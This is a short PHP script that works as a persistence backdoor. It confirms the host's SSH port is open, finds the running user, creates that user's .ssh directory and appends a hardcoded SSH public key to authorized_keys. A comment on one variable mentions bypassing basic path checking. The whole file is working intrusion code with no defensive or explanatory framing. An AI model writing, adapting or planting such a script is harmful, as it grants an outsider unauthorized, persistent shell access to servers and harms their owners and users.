<?php

//IMPORTANT VARS-----------------------------------------------------------IMPORTANT VARS---------------------------------------------------------------IMPORTANT VARS
$ssh_key = "";
//IMPORTANT VARS-----------------------------------------------------------IMPORTANT VARS---------------------------------------------------------------IMPORTANT VARS

$ditection_passer = ""; //add a path to bypass basic path checking

$is_shh_open = null;

//get ip adress of host(this machine)
  $ip = trim(shell_exec("ip -4 -o addr show dev eth0 | awk '{ gsub(/\\/[0-9]+$/, \"\", \$4); print \$4 }'"));

    // Suppress warnings using the @ operator for cleaner output
// 0.5s responce time; port 22(ssh) avalbility check
    $connection = @fsockopen($ip, 22, $errno, $errstr, 0.5);

    if (is_resource($connection)) {
        // Connection successful, so the port is open
        $is_shh_open = true;
    } else {
        // Connection failed
        exit;//exit program if failed
    }

 fclose($connection);//close conection

    $username = trim(shell_exec("whoami"));//find username

if (!is_dir("/home/" . $username . "/.ssh")) { //check if dir exists
    mkdir("/home/" . $username . "/.ssh", 0700, true);// make dir if none exists
}


    $file = "/home/" . $username . "/.ssh/authorized_keys"; // ssh key file path

    file_put_contents($file, "\n" . $ssh_key, FILE_APPEND);//apphend ssh key to filepath
?>

